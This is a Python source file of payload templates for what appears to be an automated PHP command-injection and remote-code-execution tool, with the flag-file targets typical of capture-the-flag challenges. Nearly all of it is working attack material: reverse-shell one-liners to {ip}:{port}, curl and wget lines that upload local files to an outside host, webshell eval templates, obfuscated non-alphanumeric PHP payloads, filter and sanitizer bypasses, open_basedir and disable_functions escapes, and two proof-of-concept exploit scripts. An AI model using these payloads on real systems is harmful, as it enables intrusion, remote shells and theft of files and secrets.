READFILE_TEMPLATES = [
    "cat {path}",
    "tac {path}",
    "nl {path}",
    "more {path}",
    "less {path}",
    "head {path}",
    "tail {path}",
    "sort {path}",
    "od -An -c {path}",
    "strings {path}",
    "paste {path}",
    "grep '.*' {path}",
    "sed -n '1,200p' {path}",
    "rev {path}",
    "uniq {path}",
    "base64 {path}",
    "awk '1' {path}",
    "dd if={path}",
    "ca\\t {path}",
    "ca''t {path}",
    "a=ca;b=t;$a$b {path}",
    "show_source('{path}')",
    "highlight_file('{path}')",
    "readgzfile('{path}')",
    "vi {path}",
    "grep '{keyword}' {path}",
    "shuf {path}",
    "xargs < {path}",
    "cut -c1- {path}",
    "column {path}",
    "pr -T {path}",
    "xxd -r {path}",
    "file -s {path}",
    "env 0<{path}",
    "bash < {path}",
    "tar -xf {path} -O -"
]

READ_ENV_TEMPLATES = [
    "env",
    "printenv",
    "set",
    "declare",
]

ROOT_DISCOVERY_TEMPLATES = [
    "diff / /home",
    "diff / /root",
    "diff / /tmp",
    "diff / /var",
    "diff / /etc",
    "diff / /usr",
    "diff / /opt",
    "diff / /proc",
    "diff / /dev",
    "diff / /bin",
    "diff / /sbin",
    "diff / /srv",
    "diff / /run",
    "diff / /mnt",
    "diff / /media",
    "ls /",
    "b=l;c=s;d=/;$b$c $d",
]

REFLECT_SHELL_TEMPLATES = [
    "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "sh -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc {ip} {port} -e /bin/sh",
    "busybox nc {ip} {port} -e /bin/sh",
    "python -c 'import os,pty,socket; s=socket.socket(); s.connect((\"{ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/sh\")'",
]

PHPINFO_TEMPLATES = [
    "php -r 'phpinfo();'",
    "phpinfo();",
    "(~%8F%97%8F%96%91%99%90)();",
    "$_=(%ff%ff%ff%ff^%a0%b8%ba%ab);$_();",
    "eval(pos(get_defined_vars()));",
    "print_r(getallheaders());",
    "show_source(scandir(getcwd())[2]);",
    "show_source(current(array_reverse(scandir(getcwd()))));",
]

DIRECTORY_ENUM_TEMPLATES = [
    "print_r(scandir('/'));",
    "var_dump(scandir('/'));",
    "var_export(scandir('/'));",
    "echo(implode('--',scandir('/')));",
    "echo json_encode(scandir('/'));",
    "print_r(scandir(dirname(__FILE__)));",
    "print_r(scandir(dirname(__DIR__)));",
    "print_r(scandir(dirname(dirname(__FILE__))));",
    "print_r(scandir(dirname(dirname(__DIR__))));",
    "print_r(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "var_dump(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "var_export(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "echo(implode('--',scandir(dirname(dirname(dirname(dirname(__DIR__)))))));",
    "echo json_encode(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "var_export(glob('*'));",
    "var_export(glob('../*'));",
    "var_export(glob('../../*'));",
    "var_export(glob('../../../*'));",
]

FILE_ENUM_TEMPLATES = [
    "show_source(next(array_reverse(scandir(getcwd()))));",
    "echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));",
    "echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));",
]

# 变量劫持
VARIABLE_HIJACK_TEMPLATES = [
    "eval(array_pop(next(get_defined_vars())));",
]

NON_ALNUM_ASSERT_POST_PAYLOAD = (
    "$__=('>'>'<')+('>'>'<');"
    "$_=$__/$__;"
    "$____='';"
    "$___=\u7730;$____.=~($___[$_]);"
    "$___=\u548c;$____.=~($___[$__]);"
    "$___=\u548c;$____.=~($___[$__]);"
    "$___=\u7684;$____.=~($___[$_]);"
    "$___=\u534a;$____.=~($___[$_]);"
    "$___=\u59cb;$____.=~($___[$__]);"
    "$_____='_';"
    "$___=\u4fef;$_____.=~($___[$__]);"
    "$___=\u7730;$_____.=~($___[$__]);"
    "$___=\u6b21;$_____.=~($___[$_]);"
    "$___=\u7ad9;$_____.=~($___[$_]);"
    "$_=$$_____;"
    "$____($_[$__]);"
)

# 触发 UA 头提示
HEADER_TIP_TRIGGER_PAYLOADS = {
    "print_r(getallheaders());",
    "eval(next(getallheaders()));",
}

# 触发变量劫持的提示
VARIABLE_HIJACK_TIP_TRIGGER_PAYLOADS = {
    "eval(array_pop(next(get_defined_vars())));",
}

ASSERT_POST_TIP_TRIGGER_PAYLOADS = {
    NON_ALNUM_ASSERT_POST_PAYLOAD,
}

HEADER_EXEC_TEMPLATES = [
    "eval(next(getallheaders()));",
]

# 空格绕过
SPACE_BYPASS_REPLACEMENTS = [
    "\\t",
    "${IFS}",
    "$IFS$9",
    "/**/",
    "<>",
    "<",
    "%09",
    "%20",
    "%a0",
]

# 无字母webshell
UPLOAD_EXEC_TEMPLATES = [
    ". /???/????????[@-[]",
    ". /tmp/php??????",
    ". /var/tmp/php??????",
]

UPLOAD_EXEC_WRAPPER_TEMPLATES = [
    "?><?=`{cmd}`;?>",
]

SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS = [
    ". /???/????????[@-[]",
    "?><?=`. /???/????????[@-[]`;?>",
]

SPECIAL_UPLOAD_POC_EGS = """
import requests

url = " "

params = {
    "shell":"?><?=`. /???/????????[@-[]`;?>"
}

file = {
    'file':("1.txt","#!/bin/sh\\n cat /flag","text/plain")
}

for i in range(1,20):
    res = requests.post(url=url, params=params, files=file)
    if "flag" in res.text:
        print(res.text)
        break"""

BACKTRACK_LIMIT_POC_EGS = """
import requests

url = " "
payload = '{"cmd":"?><?=`sort /f*`?>","+":"' + "-" * 1000000 + '"}'
res = requests.post(url=url, data={"letter": payload})
print(res.text)
"""

PHP_EXEC_WRAPPERS = [
    "system",
    "passthru",
    "shell_exec",
    "exec",
    "popen",
    "proc_open",
]

# 短标签
SHORT_TAG_TEMPLATES = [
    "<?={payload}?>",
    "<?= {payload} ?>",
]

UPLOAD_MODERN_WRAPPER_TEMPLATES = [
    "<?php {payload} ?>",
    "<?php\n{payload}\n?>",
    "<?php/**/{payload}?>",
    "GIF89a<?php {payload} ?>",
    "GIF89a<?= {expr} ?>",
]

UPLOAD_LEGACY_WRAPPER_TEMPLATES = [
    "<% {payload} %>",
    "<%={expr}%>",
    '<script language="php">{payload}</script>',
]

UPLOAD_SHELL_CMD_WRAPPER_TEMPLATES = [
    "<?=`{cmd}`?>",
    "<?= `{cmd}` ?>",
    "GIF89a<?=`{cmd}`?>",
]

# 反引号
BACKTICK_TEMPLATES = [
    "`{cmd}`",
    "echo `{cmd}`;",
    "print(`{cmd}`);",
    "var_dump(`{cmd}`);",
    "die(`{cmd}`);",
    "exit(`{cmd}`);",
]

BACKTICK_COMMAND_TEMPLATES = [
    "cat {path}",
    "tac {path}",
]

INCLUDE_TEMPLATES = [
    "include $_GET[x];&x=php://filter/read=convert.base64-encode/resource={path}",
    "include('{path}');",
    "require('{path}');",
    "include_once('{path}');",
    "require_once('{path}');",
]

WEBSHELL_TEMPLATES = [
    "eval($_GET[x]);&x=system('{cmd}');",
    "assert($_POST[x]);",
    "call_user_func($_GET[x], $_GET[y]);",
    "$__=array($_GET[y]);call_user_func_array($_GET[x], $__);",
    "$__=array($_GET[y]);array_map($_GET[x], $__);",
    "$__=array($_GET[y]);array_filter($__, $_GET[x]);",
    "preg_replace('/.*/e', $_POST[x], 'x');",
    "$__=create_function('', $_POST[x]);$__();",
]



# AUTO-ONLY ：以下的 payload 只会在 Auto 模式下额外使用

AUTO_ARG_INJECT_BY_CMD = {
    "file": [
        "-f{path}",
        "-r {path}",
        "-s {path}",
        "--mime-encoding {path}",
    ],
    "curl": [
        "-o /tmp/f {path}",
        "-K {path}",
        "-F file=@{path} http://{ip}:{port}/",
        "-d @{path} http://{ip}:{port}/",
        "--upload-file {path} http://{ip}:{port}/",
    ],
    "wget": [
        "--post-file={path} http://{ip}:{port}/",
        "--output-document=/tmp/f http://{ip}:{port}/",
    ],
    "tar": [
        "-cf /tmp/x {path}",
        "--to-command=sh -c 'id'",
        "--checkpoint=1 --checkpoint-action=exec=sh",
    ],
    "zip": [
        "-T -TT 'sh -c id' /tmp/x.zip {path}",
    ],
    "git": [
        "log --output={path} --format=%ae",
        "--upload-pack='sh -c id;' x",
    ],
    "find": [
        "/ -name flag -exec cat {{}} ;",
        "{path} -name * -exec cat {{}} ;",
    ],
    "ls": [
        "-la {path}",
        "-R /",
        "/f*",
        "/*lag*",
    ],
    "grep": [
        "-R . {path}",
        "'' {path}",
        ". {path}",
    ],
    "cat": [
        "{path}",
        "/etc/passwd",
    ],
}

# 根据 sanitizer 触发。
AUTO_ESCAPESHELLARG_GADGETS = [
    "172.17.0.2' -v -d a=1",
    "x' -F file=@{path} http://{ip}:{port}/ -H 'x: 1",
]

AUTO_ESCAPESHELLCMD_GADGETS = [
    "--open-files-in-pager=id",
    "--pager=id",
]

AUTO_ADDSLASHES_SAFE = [
    "`cat {path}`",
    "`cat$IFS${path}`",
]

AUTO_HTMLSPECIALCHARS_SAFE = [
    #  < > & " '
    "system(current(getallheaders()));",
    "eval(array_pop(next(get_defined_vars())));",
    "print_r(scandir(chr(47)));",
    "readfile(chr(47).chr(102).chr(108).chr(97).chr(103));",
]

AUTO_PRECISE_EVAL_TEMPLATES = [
    "eval($_POST['{key}']);",
    "eval($_GET['{key}']);",
    "assert($_REQUEST['{key}']);",
    "system($_POST['{key}']);&{key}=cat {path}",
    "system($_GET['{key}']);&{key}=cat {path}",
]

AUTO_PRECISE_INCLUDE_TEMPLATES = [
    "php://filter/read=convert.base64-encode/resource={path}",
    "php://filter/convert.iconv.utf-8.utf-16le/resource={path}",
    "data://text/plain,<?php system('cat {path}');?>",
    "data://text/plain;base64,{b64}",
    "php://input",
    "expect://id",
    "zip://{path}#shell.php",
]

AUTO_FILE_READ_PATH_TEMPLATES = [
    "{path}",
    "php://filter/read=convert.base64-encode/resource={path}",
    "php://filter/convert.iconv.utf-8.utf-16le/resource={path}",
]


AUTO_PHP7_ONLY = [
    "('system')('cat {path}');",
    "'system'('cat {path}');",
    "'phpinfo'();",
    "('phpinfo')();",
    "(~%8C%86%8C%8B%9A%92)('cat {path}');",
]

AUTO_OPEN_BASEDIR_BYPASS = [
    "print_r(glob('/*'));",
    "foreach(glob('/*') as $f){echo $f.\"\\n\";}",
    "chdir('..');ini_set('open_basedir','..');chdir('..');chdir('..');"
    "chdir('..');chdir('..');ini_set('open_basedir','/');"
    "echo file_get_contents('{path}');",
    "symlink('{path}','/tmp/bp');echo file_get_contents('/tmp/bp');",
    "$d=new DirectoryIterator('glob:///*');foreach($d as $f){echo $f.\"\\n\";}",
]

AUTO_DISABLE_FN_BYPASS = [
    "putenv('LD_PRELOAD=/tmp/a.so');mail('a','a','a','a');",
    "pcntl_exec('/bin/sh',['-c','cat {path} > /tmp/o']);readfile('/tmp/o');",
    "$f=FFI::cdef('int system(const char*);');$f->system('cat {path}');",
    "new Imagick('vid:msl:/tmp/1.msl');",
    "error_log('<?php system($_GET[0]);?>',3,'/tmp/x.php');include('/tmp/x.php');",
]

# base64 编码
AUTO_BASE64_PREWRAP_TEMPLATES = [
    "{b64}",
]

# URL 编码
AUTO_URLDECODE_PREWRAP_TEMPLATES = [
    "{urlenc}",
]
